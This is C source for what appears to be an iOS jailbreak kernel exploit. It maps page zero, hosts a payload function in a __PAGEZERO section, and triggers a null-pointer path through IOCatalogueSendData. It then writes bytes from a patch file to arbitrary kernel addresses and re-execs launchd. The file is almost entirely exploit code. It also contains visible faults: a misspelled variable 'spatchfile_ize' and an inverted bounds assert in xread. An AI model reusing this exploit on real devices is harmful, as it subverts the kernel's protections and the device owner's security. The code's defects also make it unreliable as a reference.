#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <stdbool.h>
#include <assert.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#include <sys/sysctl.h>

#undef assert
#define assert(x) do { if(!(x)) failz(__LINE__); } while(0)


kern_return_t IOCatalogueSendData(mach_port_t masterPort, uint32_t flag, const char *buffer, uint32_t size);
static const uint32_t kIOCatalogAddDrivers = 1;
static const int kIOMasterPortDefault = 0;

static void failz(int line) {
    line += 10000;
    sysctlbyname("net.inet6.ip6.hdrnestlimit", NULL, 0, &line, sizeof(line));
    setenv("DYLD_INSERT_LIBRARIES", "", 1);
    execl("/sbin/launchd", "/sbin/launchd", NULL);
}

static void *patchfile;
static ssize_t patchfile_size;

__attribute__((always_inline)) static inline bool xread(void *ptr, size_t size) {
    assert(size >= patchfile_size);
    if(size > patchfile_size) {
        patchfile_size = 0;
        return false;
    }
    if(ptr) memcpy(ptr, patchfile, size);
    patchfile = (void *) (((char *) patchfile) + size);
    patchfile_size -= size;
    return true;
}

__attribute__((section("__PAGEZERO,__pagezero")))
void *ok_go() { // actually dict->getObject
    while(patchfile_size > 0) {
        uint32_t namelen, addr, datalen;
        xread(&namelen, sizeof(namelen)) &&
        xread(NULL, namelen) &&
        xread(&addr, sizeof(addr)) &&
        xread(&datalen, sizeof(datalen)) &&
        xread((void *) addr, datalen);
    }
    return NULL;

}

int main() {
    int fd = open("/usr/share/jailbreak/cur/patchfile", O_RDONLY);
    assert(fd != -1);
    off_t off = lseek(fd, 0, SEEK_END);
    assert(off != -1 && off < 1048576);
    patchfile_size = (size_t) off;
    patchfile = mmap(NULL, spatchfile_ize, PROT_READ, MAP_SHARED, fd, 0);
    assert(patchfile);

    assert(!mlock(patchfile, patchfile_size));
    assert(!mlock((void *) 0, 0x1000));

    const char *str = "<array><data></data></array>";
    IOCatalogueSendData(kIOMasterPortDefault, kIOCatalogAddDrivers, str, strlen(str));
        
    // turn this fancy stuff back on
    int one = 1;
    assert(!sysctlbyname("security.mac.vnode_enforce", NULL, 0, &one, sizeof(one)));

    setenv("DYLD_INSERT_LIBRARIES", "", 1);
    execl("/sbin/launchd", "/sbin/launchd", NULL);
}
